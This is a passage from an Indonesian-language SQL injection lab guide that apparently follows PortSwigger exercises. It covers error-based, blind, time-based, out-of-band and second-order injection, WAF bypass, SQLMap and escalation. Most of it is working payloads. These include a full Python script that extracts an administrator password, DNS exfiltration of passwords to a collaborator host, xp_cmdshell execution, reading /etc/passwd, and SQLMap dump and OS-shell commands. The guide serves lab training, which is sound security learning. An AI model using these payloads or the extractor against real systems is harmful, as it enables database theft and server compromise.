-- Next table (skip yang sudah ditampilkan)
'+AND+1=CONVERT(int,(SELECT+TOP+1+name+FROM+sys.tables+WHERE+name+NOT+IN+('users')))--
```

---

## 4.4 PostgreSQL Error-Based

### CAST ke Integer

```
[PgSQL]
'+AND+1=CAST((SELECT+current_database())+AS+integer)--
```

**Error:**

```
invalid input syntax for type integer: "appdb"
```

### Dump Users

```
[PgSQL]
'+AND+1=CAST((SELECT+username+FROM+users+LIMIT+1)+AS+integer)--
'+AND+1=CAST((SELECT+password+FROM+users+WHERE+username='administrator')+AS+integer)--
```

---

# 🕵️ 5. Boolean Blind SQL Injection

## 5.1 Blind — Conditional Responses (Lab 11)

### 📌 Skenario

Inject ke dalam **Cookie** (`TrackingId`). Aplikasi tidak tampilkan data, tapi response beda kalau kondisi TRUE vs FALSE:

- **TRUE** → ada teks `Welcome back!` di response
- **FALSE** → tidak ada

**Apa yang kita ketahui dari ini:**

- Response ada dua state yang bisa dibedakan
- Kita bisa construct condition apapun dan observe state

### Konfirmasi Boolean Blind

```
[Burp] Modifikasi cookie:
Cookie: TrackingId=xyz'+AND+'1'='1; session=...
```

→ Cek apakah `Welcome back!` muncul (TRUE).

```
Cookie: TrackingId=xyz'+AND+'1'='2; session=...
```

→ `Welcome back!` tidak muncul (FALSE).

Jika kedua response **berbeda** → Boolean Blind SQLi terkonfirmasi.

### Konfirmasi Ada Tabel dan User

```
-- Tabel users ada?
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+LIMIT+1)='a

-- User 'administrator' ada?
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a
```

### Cek Panjang Password

```
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>10)='a
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>20)='a
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=20)='a
```

### Ekstrak Password Karakter per Karakter

```
TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a
TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='b
...
```

Sampai ketemu karakter yang TRUE.

### Burp Intruder untuk Automasi

```
[Burp] Send to Intruder (Ctrl+I)

Attack type: Cluster Bomb
Payload position 1 (posisi karakter): §1§
Payload position 2 (karakter): §a§

Payload:
TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,§1§,1)+FROM+users+WHERE+username='administrator')='§a§

Payload set 1: Numbers 1-20
Payload set 2: a-z, 0-9

Settings → Filter: Response contains "Welcome back!"
```

---

## 5.2 Blind — Conditional Errors (Lab 12)

### 📌 Skenario

Tidak ada teks indikator yang berbeda. Tapi bisa trigger database error (HTTP 500) secara kondisional:

- Kondisi TRUE → paksakan error (divide by zero)
- Kondisi FALSE → response normal

### Payload Conditional Error — Oracle

Gunakan `CASE WHEN`:

```
TrackingId=xyz'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'
```

→ `1=1` TRUE → `TO_CHAR(1/0)` → divide by zero → **500 error**

```
TrackingId=xyz'||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'
```

→ `1=2` FALSE → `''` (string kosong) → **200 normal**

### Konfirmasi User Administrator

```
TrackingId=xyz'||(SELECT+CASE+WHEN+(SELECT+COUNT(*)+FROM+users+WHERE+username='administrator')=1+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'
```

→ 500 = user `administrator` ada

### Ekstrak Password (Conditional Error)

```
TrackingId=xyz'||(SELECT+CASE+WHEN+(SELECT+SUBSTR(password,1,1)+FROM+users+WHERE+username='administrator')='a'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'
```

- 500 → karakter pertama adalah 'a'
- 200 → bukan 'a'

### PostgreSQL Conditional Error

```
[PgSQL]
TrackingId=xyz'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+1/0+ELSE+1+END)=1--
TrackingId=xyz'+AND+(SELECT+CASE+WHEN+(username='administrator')+THEN+1/0+ELSE+1+END+FROM+users+LIMIT+1)=1--
```

### MySQL Conditional Error

```
[MySQL]
'+AND+IF((SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a',(SELECT+1+UNION+SELECT+2),1)-- -
```

---

## 5.3 Manual Boolean Extraction

### Konsep SUBSTRING + ASCII

```sql
-- Ambil karakter ke-1 dari nama DB
SUBSTRING(database(), 1, 1) = 's'   -- cek langsung

-- Binary search dengan ASCII (lebih efisien)
ASCII(SUBSTRING(database(), 1, 1)) > 100
```

### Binary Search Workflow

```
Karakter pertama DB — binary search:
ASCII > 100?  → TRUE  (>100)
ASCII > 110?  → TRUE  (>110)
ASCII > 115?  → FALSE (≤115)
ASCII > 112?  → TRUE  (>112)
ASCII > 113?  → TRUE  (>113)
ASCII > 114?  → TRUE  (>114)
ASCII = 115 = 's'
```

Mengapa binary search? 7 test = 1 karakter. Linear search = 26-96 test per karakter.

### Payload di Burp Repeater

```
[MySQL]
'+AND+ASCII(SUBSTRING(database(),1,1))>100-- -
'+AND+ASCII(SUBSTRING(database(),1,1))>110-- -
'+AND+SUBSTRING(database(),1,1)='s'-- -
```

---

## 5.4 Automation dengan Python

### 📌 Kapan Digunakan

Saat manual extraction **terbukti berhasil** (TRUE/FALSE terkonfirmasi) tapi terlalu lambat.

> **Jangan jalankan script ini tanpa konfirmasi manual terlebih dahulu.** Script tidak bisa menggantikan pemahaman injection context.

```python
#!/usr/bin/env python3
"""
Boolean Blind SQLi Extractor — Generic cookie/parameter injector
Cocok untuk PortSwigger-style dan HTB/THM labs

Precondition:
  - TRUE/FALSE response sudah terkonfirmasi manual
  - true_marker sudah diidentifikasi
  - SQL dialect sudah diidentifikasi (script ini default MySQL)
"""

import argparse
import sys
import time
from urllib.parse import urlparse
import requests


def valid_url(value: str) -> str:
    parsed = urlparse(value)
    if parsed.scheme not in ("http", "https"):
        raise argparse.ArgumentTypeError("URL must start with http:// or https://")
    if not parsed.netloc:
        raise argparse.ArgumentTypeError("Invalid URL: missing host")
    return value


def valid_identifier(value: str) -> str:
    if not value.replace("_", "").replace("-", "").isalnum():
        raise argparse.ArgumentTypeError(
            "Parameter name must contain only letters, numbers, _ or -"
        )
    return value


def get_params():
    parser = argparse.ArgumentParser(
        description="Boolean Blind SQLi Extractor — authorized lab use only."
    )
    parser.add_argument("--url", required=True, type=valid_url, help="Target URL")
    parser.add_argument(
        "--cookie", default="TrackingId",
        type=valid_identifier,
        help="Injectable cookie name (default: TrackingId)"
    )
    parser.add_argument(
        "--marker", default="Welcome back",
        help="Text present in TRUE response only"
    )
    parser.add_argument(
        "--query",
        default="SELECT password FROM users WHERE username='administrator'",
        help="SQL expression to extract"
    )
    parser.add_argument("--max-len", type=int, default=50, help="Max chars to extract")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay between requests (s)")
    return parser.parse_args()


def is_true(session, url, cookie_name, payload, marker, timeout):
    cookies = {cookie_name: payload}
    try:
        r = session.get(url, cookies=cookies, timeout=timeout)
        return marker in r.text
    except requests.RequestException as exc:
        print(f"\n[!] Request error: {exc}", file=sys.stderr)
        return False


def extract_string(session, url, cookie_name, sql_query, marker, max_len, delay):
    result = []
    print(f"[*] Extracting: {sql_query}")

    # Step 1: determine length
    length = 0
    for i in range(1, max_len + 1):
        # Adjust SQL dialect as needed:
        # MySQL: LENGTH()   PostgreSQL: LENGTH()   Oracle: LENGTH()
        payload = f"xyz' AND (SELECT LENGTH(({sql_query})))>={i}-- -"
        if is_true(session, url, cookie_name, payload, marker, 10):
            length = i
        else:
            break

    if not length:
        print("[-] Could not determine length. Verify marker and SQL dialect.")
        return ""

    print(f"[*] Length: {length}")

    # Step 2: binary search per character
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            # MySQL: SUBSTRING()   PostgreSQL: SUBSTRING()   Oracle: SUBSTR()
            payload = f"xyz' AND ASCII(SUBSTRING(({sql_query}),{pos},1))>{mid}-- -"
            if is_true(session, url, cookie_name, payload, marker, 10):
                lo = mid + 1
            else:
                hi = mid - 1

        char_code = lo
        if char_code < 32 or char_code > 126:
            break
        char = chr(char_code)
        result.append(char)
        print(f"\r[+] Progress: {''.join(result)}", end="", flush=True)
        time.sleep(delay)

    print()
    return "".join(result)


def main():
    args = get_params()
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"

    result = extract_string(
        session, args.url, args.cookie,
        args.query, args.marker, args.max_len, args.delay
    )

    if result:
        print(f"[+] Result: {result}")
    else:
        print("[-] Could not extract. Check: marker, SQL dialect, injection point.")


if __name__ == "__main__":
    main()
```

**Penggunaan:**

```bash
# Dump password administrator (PortSwigger cookie-based)
python3 boolean_blind.py \
  --url "https://TARGET.web-security-academy.net/filter?category=Gifts" \
  --cookie "TrackingId" \
  --marker "Welcome back" \
  --query "SELECT password FROM users WHERE username='administrator'"

# Dump DB name (GET parameter-based — ubah script ke param injection jika perlu)
python3 boolean_blind.py \
  --url "http://TARGET/item" \
  --marker "Product" \
  --query "database()"
```

> **[Oracle] Adaptation:** Ganti `SUBSTRING` → `SUBSTR`, `LENGTH` → `LENGTH` (sama), tambahkan `FROM dual` jika query standalone.
> 
> **[PgSQL] Adaptation:** Syntax `SUBSTRING()` sama; `ASCII()` sama.

---

# ⏱️ 6. Time-Based Blind SQL Injection

## 6.1 Blind — Time Delays (Lab 14)

### 📌 Skenario

Tidak ada perbedaan response sama sekali. Tidak ada TRUE/FALSE. Tapi bisa paksa database untuk delay.

### Payload per Database

**[PgSQL]** — Recommended form (type-safe):

```
TrackingId=xyz' AND 1=(SELECT 1 FROM pg_sleep(10))--
```

**[PgSQL]** — Lab 14 exact form (PortSwigger-specific):

```
TrackingId=xyz'||pg_sleep(10)--
```

> ⚠️ **[PgSQL] pg_sleep() caveat:** `pg_sleep()` mengembalikan tipe `void`. Operator `||` (string concat) pada `void` secara teknis adalah type mismatch di PostgreSQL strict mode. Lab PortSwigger menerima `||pg_sleep(10)` karena query context spesifik lab. Untuk portabilitas dan kejelasan, gunakan form `AND 1=(SELECT 1 FROM pg_sleep(10))` atau stacked query `%3BSELECT pg_sleep(10)--`.

**[MySQL]**:

```
TrackingId=xyz' AND SLEEP(10)-- -
```

**[MSSQL]**:

```
TrackingId=xyz'; WAITFOR DELAY '0:0:10'--
```

**[Oracle]**:

```
TrackingId=xyz'||dbms_pipe.receive_message(('a'),10)--
```

### Burp Suite Tips untuk Time-Based

```
[Burp] Repeater:
1. Kirim payload → perhatikan response time di pojok kanan bawah Repeater
2. Baseline biasanya <300ms
3. Jika delay ~10s terkonfirmasi → Time-Based SQLi!

[Burp] Settings → Project Options → Connections
- Naikkan timeout jika request time-out sebelum 10s
- Default timeout Burp = 120s, cukup untuk test
```

```bash
# Konfirmasi dengan time command
time curl -s -o /dev/null \
  --get --data-urlencode "id=10 AND 1=(SELECT 1 FROM pg_sleep(10))" \
  'http://TARGET/item'
# Ekspektasi: real ~10s
```

---

## 6.2 Blind — Time Delays + Data Retrieval (Lab 15)

### Teknik: Delay Kondisional

True → delay, False → tidak delay.

### [PgSQL] — Conditional Sleep (Stacked Query)

```
TrackingId=xyz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

(`%3B` = `;` — stacked query)

### Konfirmasi User Administrator

```
[PgSQL]
TrackingId=xyz'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

→ Delay 10s = user ada.

### [MySQL] Conditional Sleep

```
TrackingId=xyz' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a', SLEEP(10), 0)-- -
```

### Ekstrak Password (PostgreSQL — Satu Karakter)

```
TrackingId=xyz'%3BSELECT+CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a'+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

### Automasi dengan Burp Intruder (Time-Based)

```
[Burp] Intruder → Sniper:
1. Tandai position karakter yang di-bruteforce
2. Payload: a-z, 0-9
3. Attack type: Sniper
4. Setelah selesai: sort berdasarkan "Response received" (waktu response)
   → Request paling lama = karakter yang benar!

Columns → Response received → Sort descending
```

### Automasi dengan SQLMap

```bash
# SQLMap lebih reliable untuk time-based karena handle timing automatically
sqlmap -r request.txt \
  --technique=T \
  --time-sec=10 \
  --dbms=PostgreSQL \
  -D public -T users -C username,password \
  --dump --batch
```

---

## 6.3 Per Database Syntax

|DB|Unconditional Delay|Conditional Delay|
|---|---|---|
|MySQL|`AND SLEEP(10)-- -`|`AND IF(condition,SLEEP(10),0)-- -`|
|PostgreSQL|`AND 1=(SELECT 1 FROM pg_sleep(10))--`|`%3BSELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END--`|
|MSSQL|`; WAITFOR DELAY '0:0:10'--`|`; IF (cond) WAITFOR DELAY '0:0:10'--`|
|Oracle|`\|dbms_pipe.receive_message('a',10)--`|`\|(SELECT CASE WHEN (cond) THEN dbms_pipe.receive_message('a',10) ELSE 1 END FROM dual)\|'`|
|SQLite|Tidak ada native sleep|Tidak applicable (lihat note)|

> **[SQLite]:** SQLite tidak memiliki fungsi delay bawaan. Time-based blind umumnya tidak bisa dilakukan langsung. Alternatif: heavy computation query jika aplikasi mengizinkan (konteks CTF tertentu), tapi ini tidak reliable. Gunakan Boolean Blind jika memungkinkan.
> 
> **[MSSQL]:** `WAITFOR DELAY` memerlukan stacked query (`;`). Cek Section 11 untuk support matrix stacked queries.

---

## 6.4 Kapan Pilih Time-Based vs Boolean

|Kondisi|Teknik yang Dipilih|
|---|---|
|Output data terlihat di response|UNION / Error-Based|
|TRUE/FALSE response berbeda (ukuran/konten)|Boolean Blind|
|Tidak ada perbedaan visible, DB bisa delay|Time-Based|
|Tidak ada output, timing tidak stabil, DB bisa callback|OOB|

> **Efisiensi:** Time-Based jauh lebih lambat dari Boolean Blind. Jika ada perbedaan response sekecil apapun (bahkan 1 byte), preferensikan Boolean Blind. SQLMap lebih reliable untuk Time-Based dibanding manual extraction.

---

# 📡 7. Out-of-Band SQL Injection

## 7.1 OOB Interaction (Lab 16)

### 📌 Kapan Digunakan

```
Tidak ada visible output
AND Boolean difference tidak terlihat
AND Time-based tidak reliable
AND DB / host bisa melakukan external network request
```

### Precondition

- **Burp Suite Pro** → Burp Collaborator (subdomain untuk DNS/HTTP callback)
- **Atau Interactsh** (free alternative): `https://app.interactsh.com/`

```bash
# Interactsh CLI
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# Output: [INF] Listening on: xxxxxxxx.oast.pro
```

### [Oracle] — DNS Lookup via XXE

```
[Oracle] Precondition: UTL_HTTP, UTL_FILE, atau XMLType privilege tersedia

'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### [MSSQL] — DNS via xp_dirtree

```
[MSSQL] Precondition: xp_dirtree tersedia, network egress diizinkan

'+EXEC+master..xp_dirtree+'\\BURP-COLLABORATOR.oastify.com\a'--
```

### [MySQL] — DNS via LOAD_FILE (Windows Only)

```
[MySQL] Precondition: Windows host, FILE privilege, UNC path accessible

'+AND+LOAD_FILE('\\\\\\\\BURP-COLLABORATOR.oastify.com\\\\a')-- -
```

> ⚠️ MySQL LOAD_FILE UNC path di SQL string: backslash `\` perlu di-escape. UNC path `\\HOST\a` = SQL string `'\\\\HOST\\a'` (4 backslash untuk dua, 2 untuk satu). Hanya berlaku di Windows host dengan network access.

### Burp Collaborator Setup

```
[Burp Pro] Burp menu → Burp Collaborator client
→ Copy to clipboard (dapat subdomain unik, misal: abcd.oastify.com)
→ Masukkan subdomain ke payload
→ Kirim request
→ Di Collaborator: klik "Poll now"
→ Jika ada DNS/HTTP interaction → OOB confirmed!
```

---

## 7.2 OOB Data Exfiltration (Lab 17)

### 📌 Tujuan

Kirim data (misal password) sebagai bagian dari DNS lookup ke server kita.

### [Oracle] — Exfil Password via DNS

```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

**DNS request yang ditangkap:**

```
s3cr3t_p4ssw0rd.BURP-COLLABORATOR.oastify.com
```

Password muncul sebagai subdomain!

### [MSSQL] — Exfil via xp_dirtree

```
[MSSQL] Stacked query:
'; DECLARE @p VARCHAR(1024);
SET @p=(SELECT password FROM users WHERE username='administrator');
EXEC('master..xp_dirtree ''\\'+@p+'.BURP-COLLABORATOR.oastify.com\a''')--
```

### OOB Flow

```
Injected SQL
    │
    ▼
Database proses query
    │
    ├── DNS lookup ke COLLABORATOR
    └── HTTP request ke COLLABORATOR
              │
              ▼
        Burp Collaborator / Interactsh
              │
              ▼
        Data exfiltrated sebagai DNS subdomain
        atau HTTP request body/path
```

> **OOB hanya membuktikan callback jika network egress dan privilege mendukung.** Kegagalan callback tidak otomatis membuktikan tidak ada SQLi — bisa saja ada SQLi tapi egress diblok.

---

# 🔁 8. Second-Order SQL Injection

### 📌 Kapan Digunakan

Payload tidak dieksekusi saat disimpan, tapi menjadi SQL setelah digunakan kembali oleh fitur lain.

### Diagram

```
User Input
     │
     ▼
Register / Profile Update
     │
     ▼
Stored di DB (mungkin ter-escape saat input, tapi raw di DB)
     │
     ▼
Feature lain mengambil data dari DB
     │
     ▼
Dynamic SQL built dari data tersimpan (tanpa escape)
     │
     ▼
Injection Executes
```

### Contoh Konseptual

Register:

```
username = admin'--
```

Saat register: tidak ada error visible.

Kemudian fitur "Change Password" pakai query:

```sql
UPDATE users SET password='newpass' WHERE username='admin'--'
```

→ Comment out kondisi WHERE username → update semua user password!

### Cara Identify di Burp

```
[Burp] HTTP History:
1. Cari request registration / profile update / comment / saved search
2. Inject payload: test'-- 
3. Browse ke fitur lain: /profile, /search, /admin/report, /order-history
4. Perhatikan: SQL error, unexpected result, behavior change

Fitur yang sering jadi "trigger":
- GET /profile → user settings
- GET /search?q= → saved search
- GET /admin/report → admin panel
- GET /order-history → purchase history
```

---

# 🧩 9. Filter / Encoding / WAF Bypass

## 9.1 Filter Bypass via XML Encoding (Lab 18)

### 📌 Skenario

Aplikasi punya WAF/filter yang detect keyword SQL (`UNION`, `SELECT`, dll) di request body. Tapi request berformat **XML** → bisa encode payload pakai XML entity encoding untuk bypass.

### Request Normal

```xml
POST /product/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Payload Langsung — Akan Di-block WAF

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

→ WAF detect `UNION SELECT` → 403 / "Attack detected"

### Bypass: XML Entity Encoding

Encode keyword SQL dengan HTML/XML entities:

```xml
<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; NULL</storeId>
```

XML parser decode entity → string asli `UNION SELECT` diteruskan ke DB.

### Payload Lengkap (Dump Users via XML)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username||'~'||password FROM users--</storeId>
</stockCheck>
```

### Burp Suite Steps

```
[Burp] Intercept POST /product/stock → Send to Repeater

1. Test payload biasa dulu:
   <storeId>1 UNION SELECT NULL</storeId>
   → Lihat apakah di-block (403 / "Attack detected")

2. Encode UNION SELECT:
   UNION → &#x55;&#x4e;&#x49;&#x4f;&#x4e;
   SELECT → &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;

3. Full payload dengan concat:
   <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username||'~'||password FROM users--</storeId>

4. Response → cari data user di output
```

### Hackvertor Extension (Burp Community/Pro)

```
[Burp] Extensibility → BApp Store → Install "Hackvertor"

1. Di Repeater, highlight teks yang mau di-encode
2. Klik kanan → Extensions → Hackvertor → Encode → hex_entities
3. Hackvertor auto-encode dan kirim ter-decode ke server
```

### Referensi Encoding

|Karakter|XML Entity Hex|
|---|---|
|U|`&#x55;`|
|N|`&#x4e;`|
|I|`&#x49;`|
|O|`&#x4f;`|
|N|`&#x4e;`|
|S|`&#x53;`|
|E|`&#x45;`|
|L|`&#x4c;`|
|C|`&#x43;`|
|T|`&#x54;`|

---

## 9.2 WAF Detection

```bash
# Tool otomatis
wafw00f http://TARGET

# Manual dari response header
curl -si http://TARGET | grep -iE "(CF-Ray|X-Sucuri-ID|Server|Via|X-Cache)"
```

Indicator WAF response:

```
403 Forbidden         → keyword filter / signature match
406 Not Acceptable    → content validation
429 Too Many Requests → rate limiting
CF-Ray header         → Cloudflare
X-Sucuri-ID header    → Sucuri
Challenge page / CAPTCHA
```

> **Fingerprint bukan proof absolut.** WAF detect adalah indikator, bukan kepastian. Test langsung.

---

## 9.3 WAF Bypass Techniques

> **Prinsip:** Bypass hanya relevan jika ada WAF/filtering terbukti memblok request. Jangan mengubah payload tanpa mengerti apa yang diblok. Tambahkan satu teknik bypass sekaligus dan retest.

### Case Variation

```
Gifts' UnIoN SeLeCt NULL-- -
```

### Comment Injection [MySQL]

```
Gifts'/*!UNION*//*!SELECT*/NULL-- -
```

### Whitespace Alternative

```
Gifts'/**/UNION/**/SELECT/**/NULL-- -
Gifts'%09UNION%09SELECT%09NULL-- -   (tab)
Gifts'%0aUNION%0aSELECT%0aNULL-- -  (newline)
```

### Hex Encoding String Values

```sql
-- 'users' → 0x7573657273
-- Hindari filter string literal
'+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=0x73686f7064622d-- -
```

### Double URL Encoding

```
' → %27 → %2527
```

Gunakan hanya jika terbukti aplikasi/proxy mendecode lebih dari satu kali. Jangan assume ini bekerja.

### Keyword Splitting [MySQL]

```sql
UN/**/ION SEL/**/ECT 1,2,3
```

WAF modern dengan normalization engine mungkin tidak tertipu ini.

---

# 🤖 10. SQLMap Workflow

> **Filosofi penggunaan:**
> 
> ```
> Manual discovery
>      ↓
> Manual validation (konfirmasi ada SQLi)
>      ↓
> Understand injection (context, technique, DB)
>      ↓
> SQLMap automation
> ```
> 
> Jangan mulai langsung dengan SQLMap. Kamu tidak belajar apapun, dan SQLMap bisa gagal ketika manual berhasil karena header/cookie kompleks, WAF, atau parameter injection yang tidak dideteksi otomatis.

## Cara Paling Reliable: Dari File Request Burp

```
[Burp] Intercept request → Klik kanan → "Save item" → Simpan sebagai request.txt
```

```bash
sqlmap -r request.txt --batch --dbs
```

`-r` otomatis handle: method, headers, cookies, body, parameters. Tidak perlu set manual.

---

## GET Parameter

```bash
sqlmap -u "http://TARGET/item?id=10" \
  -p id --batch --dbs
```

## POST Parameter

```bash
sqlmap -u "http://TARGET/login" \
  --data="username=test&password=test" \
  -p username --batch --dbs
```

## Cookie Injection

```bash
sqlmap -u "http://TARGET/dashboard" \
  --cookie="TrackingId=xyz*" \
  --batch --dbs
# (*) menandai injection point di cookie value
```

## Header Injection

```bash
# User-Agent injection
sqlmap -u "http://TARGET/" \
  --user-agent="test*" --batch --dbs

# Custom header
sqlmap -u "http://TARGET/" \
  --headers="X-Forwarded-For: 10.0.0.1*" --batch --dbs
```

## JSON Body

```bash
# Cara terbaik: dari request file
cat > api_request.txt << 'EOF'
POST /api/search HTTP/1.1
Host: TARGET
Content-Type: application/json
Content-Length: 20

{"search":"test*"}
EOF

sqlmap -r api_request.txt --batch --dbs
```

---

## Enumeration Sequence

```bash
# 1. List databases
sqlmap -r request.txt --batch --dbs

# 2. List tables
sqlmap -r request.txt --batch -D targetdb --tables

# 3. List columns
sqlmap -r request.txt --batch -D targetdb -T users --columns

# 4. Dump specific columns
sqlmap -r request.txt --batch -D targetdb -T users -C username,password --dump
```

---

## SQLMap dengan Teknik Spesifik

```bash
# Hanya UNION
sqlmap -r request.txt --technique=U --batch --dbs

# Hanya Boolean Blind
sqlmap -r request.txt --technique=B --batch --dbs

# Hanya Time-Based
sqlmap -r request.txt --technique=T --time-sec=10 --batch --dbs

# Hanya Error-Based
sqlmap -r request.txt --technique=E --batch --dbs
```

## Proxy via Burp Suite

```bash
# Lihat semua request SQLMap di Burp HTTP History
sqlmap -r request.txt \
  --proxy="http://127.0.0.1:8080" \
  --batch --dbs
```

Berguna untuk: debug payload SQLMap, capture request, analisis manual.

---

## SQLMap Output Analysis

```
# Injectable confirmed:
parameter 'id' is vulnerable

# Injection type detected:
boolean-based blind
time-based blind
UNION query
error-based

# DB info:
back-end DBMS: MySQL >= 5.0.12
banner: 8.0.32-MySQL Community Server
```

> **Jangan samakan "SQLi detected" dengan "full database access".** Kemampuan tergantung teknik yang berhasil dan privilege DB.

SQLMap menyimpan hasil di:

```bash
find ~/.local/share/sqlmap -type f | grep -E 'dump|log'
```

---

## Common SQLMap Flags

|Flag|Fungsi|
|---|---|
|`--batch`|Auto-answer semua prompt|
|`--dbs`|List databases|
|`-D db --tables`|List tables di DB|
|`-T tbl --columns`|List columns di table|
|`--dump`|Dump data|
|`-C col1,col2`|Kolom spesifik|
|`--technique=BEUSTQ`|Filter technique|
|`--time-sec=10`|Threshold time-based|
|`--level=3 --risk=2`|Lebih agresif (lebih banyak request)|
|`--tamper=`|Gunakan tamper script|
|`--random-agent`|Random User-Agent|
|`--delay=1`|Delay antar request (stealth)|
|`--os-shell`|Coba OS shell (precondition banyak)|
|`--file-read=/etc/passwd`|Baca file|
|`--file-write=src --file-dest=dst`|Tulis file ke server|
|`--proxy=http://127.0.0.1:8080`|Proxy via Burp|
|`-r request.txt`|Load request dari file Burp|

---

## Tamper Scripts untuk WAF

|Tamper|Fungsi|Kapan Dipakai|
|---|---|---|
|`space2comment`|Spasi → `/**/`|WAF filter spasi|
|`randomcase`|RaNdOm CaSe|Filter keyword case-sensitif|
|`charencode`|URL encode karakter|Filter karakter tertentu|
|`between`|`>` → `BETWEEN x AND y`|Filter operator comparison|
|`equaltolike`|`=` → `LIKE`|Filter operator `=`|
|`base64encode`|Base64 encode payload|Aplikasi decode Base64|

```bash
sqlmap -r request.txt \
  --tamper=space2comment,randomcase \
  --random-agent --batch --dbs
```

> **Jangan stack banyak tamper secara acak.** Setiap transformasi bisa merusak payload. Tambahkan satu tamper, retest, lanjut ke berikutnya hanya jika diperlukan.

> **Urutan troubleshooting WAF:**
> 
> ```
> Manual payload berhasil tapi WAF memblok SQLMap
>   ↓
> Identifikasi apa yang diblok dari response
>   ↓
> Pilih satu tamper yang relevan
>   ↓
> Retest
>   ↓
> Tamper kedua hanya jika masih diblok
> ```

---

# 🧱 11. Stacked Queries

### 📌 Kapan Digunakan

Saat DBMS/driver memungkinkan lebih dari satu SQL statement dalam satu request.

```sql
SELECT ...; SELECT ...
```

### Support Matrix

|DB|Support|Catatan|
|---|---|---|
|MySQL|Driver-dependent|Multi-statements harus di-enable di banyak connector; tidak default|
|PostgreSQL|Umumnya mendukung|Driver/application behavior menentukan|
|MSSQL|Ya (`;`)|Paling sering mendukung stacked|
|Oracle|Terbatas|PL/SQL context punya aturan berbeda|
|SQLite|API-dependent|Tergantung wrapper library|

### Test Stacked Query

```
[MSSQL/PgSQL]
id=10; SELECT 1--

[MySQL] (jika multi_statements enabled)
id=10; SELECT 1-- -
```

Jika menghasilkan error atau query tidak dijalankan, stacked queries tidak tersedia di context ini.

### Contoh MSSQL Stacked

```
[MSSQL] Precondition: stacked query support + privilege
'; EXEC xp_cmdshell 'whoami'--
```

---

# 💻 12. SQL Injection → RCE / Escalation

> **Ini adalah post-exploitation escalation path, bukan kemampuan default SQLi.** Setiap teknik punya precondition yang ketat.

## 12.1 Pre-check: Privilege & Configuration

**Sebelum mencoba file write atau command execution, selalu cek prerequisite.**

### [MySQL] Privilege Check

```bash
# Via UNION (jika tersedia)
'+UNION+SELECT+GROUP_CONCAT(PRIVILEGE_TYPE),NULL+FROM+information_schema.user_privileges+WHERE+GRANTEE=CONCAT(CHAR(39),user(),CHAR(39))-- -
```

**Hasil yang kita cari:**

```
SELECT,INSERT,UPDATE,DELETE,FILE,...
```

### [MySQL] secure_file_priv Check

```bash
'+UNION+SELECT+@@secure_file_priv,NULL-- -
```

Interpretasi:

- `''` (kosong) → tidak dibatasi, bisa tulis ke mana saja (paling baik)
- `/var/lib/mysql-files/` → hanya bisa tulis ke path itu
- `NULL` → file read/write dinonaktifkan (tidak bisa INTO OUTFILE)

### [MySQL] Konfirmasi File Read Dulu

Sebelum upload, konfirmasi FILE read privilege bekerja:

```bash
'+UNION+SELECT+LOAD_FILE('/etc/passwd'),NULL-- -
```

→ Jika `/etc/passwd` muncul di response → FILE read bekerja → INTO OUTFILE kemungkinan bisa.

---

## 12.2 MySQL — INTO OUTFILE

